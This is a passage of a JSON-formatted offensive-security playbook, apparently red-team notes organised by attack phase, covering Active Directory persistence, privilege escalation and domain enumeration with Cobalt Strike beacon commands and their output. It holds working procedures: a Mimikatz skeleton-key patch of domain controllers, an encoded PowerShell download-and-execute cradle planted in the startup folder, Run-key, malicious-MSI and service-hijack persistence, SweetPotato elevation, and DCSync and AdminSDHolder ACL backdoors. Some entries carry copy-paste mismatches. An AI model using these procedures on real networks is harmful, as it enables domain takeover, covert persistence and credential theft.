        "name": "Skeleton Key",
        "phase": "04. Persistence",
        "ttp": "S0007",
        "external": false,
        "description": "NoDescription",
        "content": "# Skeleton Key\nThe Skeleton Key must be used on Domain Controllers where as LSASS will be patched to allow any user to be authenticated with the password `mimikatz` (their real passwords still work too).\n\n\u26d4 The skeleton key cannot be removed unless the domain controller is rebooted and it can cause side effects such as replication issues.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n```\nbeacon> mimikatz !misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n[RC4] functions\n[RC4] init patch OK\n[RC4] decrypt patch OK\n\nbeacon> make_token EDU\\Administrator mimikatz\n[+] Impersonated EDU\\john\n\nbeacon> ls \\\\dc-2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 11:11:35   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n dir     10/18/2016 01:59:39   Documents and Settings\n dir     05/23/2018 11:06:05   PerfLogs\n dir     12/13/2017 21:00:56   Program Files\n dir     05/10/2022 02:01:55   Program Files (x86)\n dir     03/10/2022 14:38:44   ProgramData\n dir     10/18/2016 02:01:27   Recovery\n dir     03/10/2022 13:52:03   Shares\n dir     05/19/2022 11:39:02   System Volume Information\n dir     03/11/2022 12:59:29   Users\n dir     05/19/2022 13:26:27   Windows\n 379kb    fil     01/28/2022 07:09:16   bootmgr\n 1b       fil     07/16/2016 13:18:08   BOOTNXT\n 448mb    fil     03/11/2022 09:19:53   pagefile.sys\n```"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": []
    },
    {
        "id": "0a754708-8c08-4c64-ac2b-5f56b0835e41",
        "name": "Startup Folder",
        "phase": "04. Persistence",
        "ttp": "T1547.001",
        "external": false,
        "description": "Starting executables located in the start up folder",
        "content": "# Startup Folder\nApplications, files and shortcuts within a user's startup folder are launched automatically when they first log in.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[SharPersist]]\nAdd to startup folder\nCreates a file called UserEnvSetup in the folowing path:\n`%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\UserEnvSetup.lnk`\n\n\u26a0 Consider the spaces in \"Start Menu\"\n\n``````powershell \nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==\" -f \"UserEnvSetup\" -m add\n``````",
            "\n## [[SharPersist]]\nCreate a new regkey with:\n* Registry key name: Updater\n* Registry key to modify: hkcurun | hkcurunonce (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`)\n\n``````powershell\ncd C:\\ProgramData\nupload C:\\Payloads\\beacon-http.exe\nmv beacon-http.exe updater.exe\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t reg -c \"C:\\ProgramData\\Updater.exe\" -a \"/q /n\" -k \"hkcurun\" -v \"Updater\" -m add\n``````"
        ],
        "tools": [
            "SharPersist"
        ],
        "steps": []
    },
    {
        "id": "0aad5932-3430-4426-b2ad-62d8f83cf5c2",
        "name": "XLL Template",
        "phase": "04. Persistence",
        "ttp": "T1137.006",
        "external": false,
        "description": "Dropping an XLL template to XLStart folder in order to gain persistence through launching Excel",
        "content": "# XLL Template\nXLL is an extension for Excel add-ins. In reality, XLL is just a regular PE-DLL file. The XLL file extension is associated with an icon very similar to other Excel-supported extensions.\nIf the XLL file is planted into the TrustCenter defined location (by default `C:\\Program Files\\Microsoft Office\\<Office1x>\\Xlstart` or `C:\\Documents and Settings\\<User_name>\\Application Data\\Microsoft\\Excel\\XLSTART`) the Add-In will automatically run on starting Excel.\nOne disadvantage of XLL files is that they can only be loaded by Excel with the correct bitness. For example, a 64-bit XLL can only be loaded by the 64-bit version of Excel.\n\n## Detection\nExcel-DNA has another attribute that may hinder coverage with Yara, likely unknown even to the malware authors. For some reason, many Excel-DNA samples have slightly more than 10,000 exported functions, most of them without any meaningful functionality. The Yara PE module export function parsing limit is only 8,192. Therefore, a Yara rule that targets a certain export name located at an index higher than 8192 will not match against the sample.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": true,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "64d0f606-f49e-4473-a13a-042522f548e3",
        "name": "OneDrive",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Get Persistence via OneDrive DLL hijacking",
        "content": "# OneDrive\n## Pre requisits\nOneDrive needs to be installed into %appdata% and NOT program files in order to work.\n \n## Path\n> %localappdata%\\Microsoft\\OneDrive\\\n\n## Process\n* Install OneDrive from [here](https://hansbrender.com/all-onedrive-versions/)\n* Create your payload\n* Clone metadata from ColorAdapterClient.dll from C:\\Windows\\System32\\ onto your payload  \n* Create the file %localappdata%\\Microsoft\\OneDrive\\ColorAdapterClient.dll  \n\n\u2757 Use DLL proxying against crashing  \n\n| dll | working | not working |\n| --- | ------- | ----------- |\n| SspiCli.dll| 20H2 | |\n| iertutil.dll| 20H2 | |\n| ncrypt.dll| 20H2 | |\n| CRYPTBASE.DLL| 20H2 | |\n| CRYPTSP.dll| 20H2 | |\n| profapi.dll| 20H2 | |\n| OneDriveTelemetryExperimental.dll| 20H2 | |\n| FileSyncTelemetryExtensions.dll| 20H2 | |\n| version.dll| 20H2 | 21H1 |\n\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "d9d27087-1f07-4982-a4c5-df801d9c055e",
        "name": "Search Order Hijacking",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.",
        "content": "# Search Order Hijacking\n\nThere are many ways an adversary can hijack DLL loads.\n* Plant malicious DLLs in a directory that will be searched before the location of a legitimate library, causing Windows to load the malicious DLL. Often this location is the current working directory of the program.\n* Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.\n* Attackers can also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n* Priv Esc: If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL will also be executed at the higher level. To reduce suspician configure the malicious DLLs to also load the legitimate DLLs they were meant to impersonate.\n\n## Safe DLL Search Mode\nDisallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. %SYSTEMROOT%)to be used before local directory DLLs (e.g. a user's home directory).\n\nGPO  \nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > Policies > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) > Enable Safe DLL search mode.\n\nRegistry  \nThe associated Windows Registry key for this is located at:\n`HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode`\n\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [
            "\n## [[API Monitor]]\nDLL Search Order Hijacking"
        ],
        "tools": [
            "API Monitor"
        ],
        "steps": []
    },
    {
        "id": "c3e47c92-8488-4ba0-b66c-547241fbbdf9",
        "name": "Teams",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# Teams\n## Pre requisits\nOneDrive needs to be installed into %appdata% and NOT program files in order to work.\n\n## Path\n> %localappdata%\\Microsoft\\Teams\\current\\  \n\n\n\u2757 Use DLL proxying against crashing  \n\n| dll | working | not working |\n| --- | ------- | ----------- |\n| ncrypt.dll | even without proxying |  |\n| CRYPTBASE.DLL |  |  |\n| CRYPTSP.dll |  |  |\n| crypt32.dll |  |  |\n| MSASN1.dll |  |  |\n| wintrust.dll |  |  |\n| winnlsres.dll |  |  | \n| MSVCP140_CLR0400.dll |  |  |\n| version.dll | 21H1-19043 |  |\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "ef68c56d-83f6-4f2a-9d7a-65cf88bca30b",
        "name": "Always Install Elevated",
        "phase": "05. Privilege Escalation",
        "ttp": "T1548",
        "external": false,
        "description": "This registry value enables an user to install applications with access to higher level folders/registry keys",
        "content": "# Always Install Elevated\nThis policy allows standard users to install applications requiring higher permissions as the user has. This is equivalent to granting full administrative rights.\n\nVulnerability can be identified via [[Tools/SharpUp]]\n\n## Exploit\nCreate a MSI installer containing the payload that will be installed and executed with SYSTEM privileges.\n\n-   Generate a new TCP payload and save it to `C:\\Payloads\\beacon-tcp.exe`.\n-   Open **Visual Studio**, select **Create a new project** and enter **installer**. Select the **Setup Wizard** project and give the project a name, like **InstallBeacon**.\n-   Use a random location like `C:\\Payloads`, then select **place in the same directory**, and click **Create**.\n-   When prompted with the choise to include files click **Add** and select the payload (beacon-tcp.exe) and click **Finish**.\n-   Highlight the **InstallBeacon** project and change the **TargetPlatform** based on the target architekture.\n-   Right-click the project and select **View > Custom Actions**.\n-   Right-click **Install** and select **Add Custom Action**.\n-   For direct execution, double-click on **Application Folder**, select your **beacon-tcp.exe** file and click **OK**.\n-   If you have selected x64 before make sure to change **Run64Bit** to **True** in the **Custom Action Properties** option.\n\nNow build the project, which should produce an MSI at `C:\\Payloads\\InstallBeacon\\Debug\\InstallBeacon.msi`.\n\n\n#opsec:\n- if installed, it will appear as an installed programm.\n- clone file metadata like  **Author** or **Manufacturer**.\n\n\n``````beacon\nbeacon> cd C:\\Temp\nbeacon> upload C:\\Payloads\\InstallBeacon\\Debug\\InstallBeacon.msi\nbeacon> run msiexec /i InstallBeacon.msi /q /n\nbeacon> connect localhost 4444\n[+] established link to child beacon: 192.168.1.253\n``````\n\n#OPSEC remove the MSI afterwards, you can use `msiexec /n /q /uninstall InstallBeacon.msi` for removing the file.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "9b9fc55f-9ec4-4cd6-b0a3-5fcfe6a39134",
        "name": "Change Domain Objects",
        "phase": "05. Privilege Escalation",
        "ttp": "T1484",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n### Change/Clear DomainObject\n\n#### Clear DomainObject\n\n```powershell\nSet-DomainObject -Identity jonas -Clear ServicePrincipalName\n```\n\n#### Add DONT\\_REQ\\_PREAUTH flag\n\n```powershell\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value                                                     \n----                           -----                                                     NORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n\nSet-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}\n\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512                              \nDONT_EXPIRE_PASSWORD           65536                              \nDONT_REQ_PREAUTH               4194304\n\n# remove again (XOR is being used)\nSet-DomainObject -Identity jonas -XOR @{UserAccountControl=4194304}\n\nGet-DomainUser -Identity jonas | ConvertFrom-UACValue\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n```\n\n#### Assign rights (DCSync)\n\n`Add-DomainObjectAcl` can be used to add a new ACL to a domain object. If we have access to a domain admin account, we can grant dcsync rights to any principal in the domain (a user, group or even computer).\n\n```powershell\nAdd-DomainObjectAcl -TargetIdentity \"DC=edu,DC=evil,DC=corp\" -PrincipalIdentity john -Rights DCSync\n```\n\n#### Assign rights (AdminSDHolder)\n\nThe AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.\n\n```powershell\nAdd-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=edu,DC=evil,DC=corp\" -PrincipalIdentity john -Rights All\n```"
        ],
        "tools": [
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "88fd66ea-35bd-48b2-a8a0-229a7c5fa173",
        "name": "UAC Bypasses",
        "phase": "05. Privilege Escalation",
        "ttp": "T1548.002",
        "external": false,
        "description": "UAC bypass to elevate from medium into a high integrity process",
        "content": "# UAC Bypasses\nThis technique enables and attacker from **Medium** to **High Integrity** without prompting for consent.\n\nBy default, applications will run in **Medium** Integrity context. Even if local administrators launch the Command Prompt \"normally\" it is not possible to execute privileged functions.\n\nThe default setting is **Prompt for consent for non-Windows binaries**, but you can configure them to the following states, top to bottom reducing security:\n* Prompt for credentials\n* Prompt for consent\n* Prompt for consent for non-Windows binaries \n* Elevate without prompting\n\n[[Seatbelt]] can be used to query the configuration applied to a machine.\nCobalt Strike has some [[UAC-Bypass]] included.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "33296a49-ec03-45c0-94c5-27b68a700550",
        "name": "Unquoted Service Path",
        "phase": "05. Privilege Escalation",
        "ttp": "T1574.009",
        "external": false,
        "description": "Hijacking the search order hirarchy of a applications DLL.",
        "content": "# Unquoted Service Paths\nAn unquoted service path is where the path to the [[Windows Services]] binary is not wrapped in quotes and contains spaces.\n\n## Conditions to exploit\n1. Vuln-Service has spaces in the path and is also not quoted\n2. Check permissions to write into the paths based on the search order\n\t1.  `C:\\Program.exe`\n\t2.  `C:\\Program Files\\Vuln.exe`\n\t3.  `C:\\Program Files\\Vuln Service\\Service.exe`\n3. Generate malicious service binary. We can do this in Cobalt Strike via **Attacks > Packages > Windows Executable (S)** and selecting the **Service Binary** output type.\n```````beacon\ncd C:\\Program Files\\Vuln Service\nupload C:\\Payloads\\beacon-tcp-svc.exe\nmv beacon-tcp-svc.exe Service.exe\nrun sc stop Vuln-Service\nrun sc start Vuln-Service\n```````\n\n4. Check beacon and connect (if TCP listener is used)\n``````\nrun netstat -anp tcp\n[...snip...]\nTCP    127.0.0.1:4444         0.0.0.0:0              LISTENING\n\nconnect localhost 4444\n[+] established link to child beacon: 10.10.17.231\n``````\n\n\n## Tools\n########\n########",
        "category": "Services",
        "stealthy": false,
        "changes": [
            "\n## [[PowerShell]]\nGet ACLs of services\n```ps\npowershell Get-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl\n  \nPath   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\Vuln Services\nOwner  : BUILTIN\\Administrators\nGroup  : wkstn1\\None\nAccess : CREATOR OWNER Allow  FullControl\n NT AUTHORITY\\SYSTEM Allow  FullControl\n BUILTIN\\Administrators Allow  FullControl\n BUILTIN\\Users Allow  Write, ReadAndExecute, Synchronize\n NT SERVICE\\TrustedInstaller Allow  FullControl\n APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n```",
            "\n## [[wmic]]\nList of every service and the path\n```cmd\nwmic service get name, pathname\nName                                      PathName\nALG                                       C:\\Windows\\System32\\alg.exe\nAppVClient                                C:\\Windows\\system32\\AppVClient.exe\nAmazonSSMAgent                            \"C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe\"\n[...snip...]\nVuln-Service-1                            C:\\Program Files\\Vuln Services\\Service 1.exe\n```"
        ],
        "tools": [
            "PowerShell",
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "7b2080cb-0a1f-48c2-a108-04022daf3c09",
        "name": "Weak Service Permissions",
        "phase": "05. Privilege Escalation",
        "ttp": "T1574.010",
        "external": false,
        "description": "Weak service permissions can be abused in order to change the binpath",
        "content": "# Weak Service Permissions\nIdentify weak [[Windows Services]] permissions via [[Tools/SharpUp]].\n\n## Change BinPath via ChangeConfig\n1. Identify vulnerable config via Get-ServiceAcl.ps1\n``````powershell\nImport-Module C:\\Tools\\Get-ServiceAcl.ps1\nGet-ServiceAcl -Name VulnService | select -expandproperty Access\n\nServiceRights     : ChangeConfig, Start, Stop\nAccessControlType : AccessAllowed\nIdentityReference : NT AUTHORITY\\Authenticated Users\nIsInherited       : False\nInheritanceFlags  : None\nPropagationFlags  : None\n``````\n2. **Authenticated Users** have **ChangeConfig**, **Start** and **Stop** privileges\n3. Change binPath\n``````powershell\nsc qc VulnService\nsc config VulnService binPath= C:\\Temp\\test-service.exe\n#query config\nsc qc VulnService\n#query status\nsc query VulnService\nsc stop VulnService\nsc start VulnService\n``````\n\n## Change Service Binary\n1. Identify BUILTIN\\Users have **Modify**\n``````powershell\nGet-Acl -Path \"C:\\Program Files\\VulnService\\Service.exe\" | fl\n\nPath   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\VulnService\\Service.exe\nOwner  : BUILTIN\\Administrators\nGroup  : wkstn1\\None\nAccess : NT AUTHORITY\\SYSTEM Allow  FullControl\n BUILTIN\\Administrators Allow  FullControl\n BUILTIN\\Users Allow  Modify, Synchronize\n APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize\n``````\n2. Manipulate the service binary\n``````powershell\nsc stop VulnService\nbeacon> upload C:\\Payloads\\Service.exe\nrun sc start VulnService\n#if tcp beacon\nbeacon> connect localhost 4444\n``````\n\n\n## Tools\n########\n########",
        "category": "Services",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "dacc4358-e199-4d19-bd6e-a5c225978bf4",
        "name": "Printer Bug",
        "phase": "05. Privilege Escalation",
        "ttp": "T1210",
        "external": false,
        "description": "Priv Escalation via PrinterBug",
        "content": "## Tools\n########\n########",
        "category": "Vulnerabilities",
        "stealthy": false,
        "changes": [
            "\n## [[SpoolSample]]\n[[Kerberos/Printer Bug]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\SpoolSample\\SpoolSample\\bin\\Debug\\SpoolSample.exe dc-2 srv1\n\n[+] Converted DLL to shellcode\n[+] Executing RDI\n[+] Calling exported function\n``````",
            "\n## [[SweetPotato]]\n[[Kerberos/Printer Bug]] [[SQL Privilege Escalation]]\n```beacon\nbeacon> execute-assembly C:\\Tools\\SweetPotato\\bin\\Debug\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc SQBFAF[...snip...]ApAA==\"\n\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n[+] Attempting NP impersonation using method PrintSpoofer to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering notification on evil PIPE \\\\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\nbeacon> connect localhost 4444\n[*] Tasked to connect to localhost:4444\n[+] host called home, sent: 20 bytes\n[+] established link to child beacon: 10.10.18.221\n```"
        ],
        "tools": [
            "SpoolSample",
            "SweetPotato"
        ],
        "steps": []
    },
    {
        "id": "eb910a47-68e9-436e-b016-94972cef4dcf",
        "name": "Certificate Store",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# Certificate Store\n\nSearch for \"Cert Publishers\" group in AD\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "0603d9a4-0941-4583-b5a5-1df6e46878c3",
        "name": "Database Server",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify databases within the network",
        "content": "# Identify Databases\n[[Tools/PowerUpSQL]] can be used with the cmdlet `Get-SQLColumnSampleDataThreaded` in order to search one or more instances for databases that contain particular keywords in the column names.\n\n```beacon\nbeacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLColumnSampleDataThreaded -Keywords \"project\" -SampleSize 5 | select instance, database, column, sample | ft -autosize\n\nInstance                     Database Column      Sample         \n--------                     -------- ------      ------         \nsrv1.edu.evil.corp,1433 master   ProjectName Build Can       \nsrv1.edu.evil.corp,1433 master   ProjectName Fresh Boat     \nsrv1.edu.evil.corp,1433 master   ProjectName Fine Apple\n```\nTraversing is not possible! It only searches the available instances.\n\nTo search over the links use `Get-SQLQuery`.\n```beacon\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select * from information_schema.tables')\"\n\nTABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE\n------------- ------------ ----------            ----------\nmaster        dbo          spt_fallback_db       BASE TABLE\nmaster        dbo          spt_fallback_edu      BASE TABLE\nmaster        dbo          spt_fallback_usg      BASE TABLE\nmaster        dbo          MSreplication_options BASE TABLE\n\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select column_name from master.information_schema.columns')\"\n\ncolumn_name\n-----------\nCity\nName\nCar\nDog\n\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select top 5 City from master.dbo.VIPClients')\"\n\nCity  \n---------  \nHeidelberg\nMannheim\nFrankfurt\n```\n\n[Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess) can be used to exfiltrate lots of data at once\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql\n```\n\nTo list all attributes of MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -filter full-data.\n```\n\nTo list all attributes of specific MS-SQL Server from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -name <computer name> \n```",
            "\n## [[BloodHound]]\nFinding potential MS SQL Admins, based on the assumption that the account running the SQL Service is also a sysadmin (which is very common);\n>MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p"
        ],
        "tools": [
            "ADReaper",
            "BloodHound"
        ],
        "steps": []
    },
    {
        "id": "c06ed08c-3ef2-405e-9b00-10ddf90947ae",
        "name": "Domain SPN",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify databases within the network",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list SPNs available in the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn\n```\n\nTo list all attributes of Specific SPN from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn -name <sam of spn>\n```"
        ],
        "tools": [
            "ADReaper"
        ],
        "steps": []
    },
    {
        "id": "4bd15813-9fa9-43ff-8e7a-fc8a36ca9b23",
        "name": "Domain Trust",
        "phase": "06. Domain Enumeration",
        "ttp": "T1482",
        "external": false,
        "description": "Identify databases within the network",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo query the Trust Attributes of the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command domain-trust\n```"
        ],
        "tools": [
            "ADReaper"
        ],
        "steps": []
    },
    {
        "id": "1ffb2611-d1b6-4414-99fa-c38c1832a351",
        "name": "PAM",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# Privilege Access Management\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "d76a4fbf-9eb0-4596-90f0-d77a98b55ff0",
        "name": "SCCM",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# SCCM\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "795b42bb-fe09-4c50-bdac-082128ee4a38",
        "name": "Web Server",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify web server within the network via domain",
        "content": "# Web Server\nInternal web apps are incredibly prevalent and are a great source of data. Think SharePoint, Confluence, ServiceNow, SIEMs and so on.\n\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "EyeWitness",
            "GoWitness"
        ],
        "steps": []
    },
    {
        "id": "6468c4ec-587c-44d4-bc62-532a8b5ffe1c",
        "name": "Domain Admins",
        "phase": "06. Domain Enumeration",
        "ttp": "T1087.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain Admins\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "a91401ae-1c52-4657-9be3-1a48c0707a4f",
        "name": "Domain Computers",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all available Computers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers\n```\n\nTo list all Computers with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -filter full-data\n```\n\nTo list attributes of Specific Computer from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -name <computer name>\n```",
            "\n## [[PowerView]]\n### Machines within OU\n\n```powershell\nGet-DomainComputer | ? { $_.DistinguishedName -match \"OU=Tier 1\" } | select DnsHostName\n\ndnshostname            \n-----------            \nsrv1.edu.evil.corp\n```\n\n### Get Property of Domain Object\n\n```powershell\nGet-DomainObject -Identity wkstn2 -Properties ms-Mcs-AdmPwd\n\nms-mcs-admpwd \n------------- \npassword123.\n```",
            "\n## [[PowerView]]\n[[Local Administrator Password Solution (LAPS)]]\n### Search computers with property\n\nFilter: `ms-Mcs-AdmPwdExpirationTime` not null\n\n```powershell\nGet-DomainObject -SearchBase \"LDAP://DC=edu,DC=evil,DC=corp\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname\n\ndnshostname              \n-----------              \nwkstn1.edu.evil.corp\nwkstn2.edu.evil.corp\n```"
        ],
        "tools": [
            "ADReaper",
            "NMAP",
            "PowerView"
        ],
        "steps": []
    },
    {
        "id": "f9352355-9d08-44f0-be7a-ccdf9d304007",
        "name": "Domain Controller",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain Controller\n\n```cmd\nset L\n\necho %logonserver%\n```\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo query the properties of Domain Controller of the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command dc\n```",
            "\n## [[Net]]\nFrom domain joined device  \n>net group \"domain controllers\" /domain\n>nslookup dc-01\n>net time",
            "\n## [[nmcli]]\nShow domain name & dns  \n`nmcli edu show eth0`",
            "\n## [[Nslookup]]\nShow Domain  \n* `nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/`\n* `nslookup -type=SRV _kerberos._tcp.dc._msdcs.<searchdomain>`\n* `nslookup -type=A gc._msdcs.<DNSForestName>`\n* `nslookup -type=SRV _ldap._tcp.pdc._msdcs.<searchdomain>`\n* `nslookup -type=SRV _ldap._tcp.gc._msdcs.<searchdomain>`\n* `nslookup -type=A <DC_FQDN>`",
            "\n## [[PowerView]]\n### Get DC\n\n```powershell\nGet-DomainController | select Forest, Name, OSVersion | fl\n\nForest    : evil.corp\nName      : dc-2.edu.evil.corp\nOSVersion : Windows Server 2016 Datacenter\n```\n\n```powershell\nGet-DomainController -Domain evil.corp | select Name\n\nName              \n----              \ndc-1.evil.corp\n```\n\n### Get DC via Trust\n\n```powershell\nGet-DomainComputer -Domain evil.external -Properties DNSHostName\n\ndnshostname           \n-----------           \nad.evil2.corp\n```",
            "\n## [[SharpHound]]\nGet DC via Trust\n>SharpHound -c DcOnly -d evil.external"
        ],
        "tools": [
            "ADReaper",
            "Net",
            "nmcli",
            "Nslookup",
            "PowerView",
            "SharpHound"
        ],
        "steps": []
    },
    {
        "id": "1b468064-9714-4c1b-8958-18411548482b",
        "name": "Domain Forest",
        "phase": "06. Domain Enumeration",
        "ttp": "T1482",
        "external": false,
        "description": "NoDescription",
        "content": "# Tools\n########\n########",
        "category": "Domain Objects",
